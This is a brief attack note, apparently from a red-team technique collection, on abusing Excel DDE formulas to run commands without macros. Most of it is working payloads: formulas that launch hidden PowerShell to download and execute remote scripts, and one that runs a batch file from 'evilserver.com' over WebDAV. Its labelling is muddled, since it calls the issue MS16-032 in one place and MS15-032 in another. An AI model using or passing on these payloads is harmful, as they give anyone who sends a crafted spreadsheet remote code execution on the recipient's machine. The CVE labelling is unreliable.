# Exploiting MS16-032 via Excel DDE without macros
DDE = transfer data between applications, a form of Inter-Process Communication (IPC)
Execute cmd and the second part is the argument.
```=cmd|'/c calc.exe'!A1```
* Arguments have to be inside single quotes 
* Length restrictions on both the executable and the arguments
* BYPASS: instruct powershell to load a script

base64 encoded
```=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\"https://trusted.domain/script.base64\");powershell -e $e'!A1```

plain .ps1
```=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\"https://trusted.domain/script.ps1\");IEX $e'!A1```

bat file via webdav (stealthier)
```=cmd|'/c \\evilserver.com\sp.bat;IEX $e'!A1```

## MS16-032 via excel DDE functionality
 https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html


```meta
ttp: T1000
internal: false
requirements: 
results: 
description: MS15-032 (DDE) vuln
```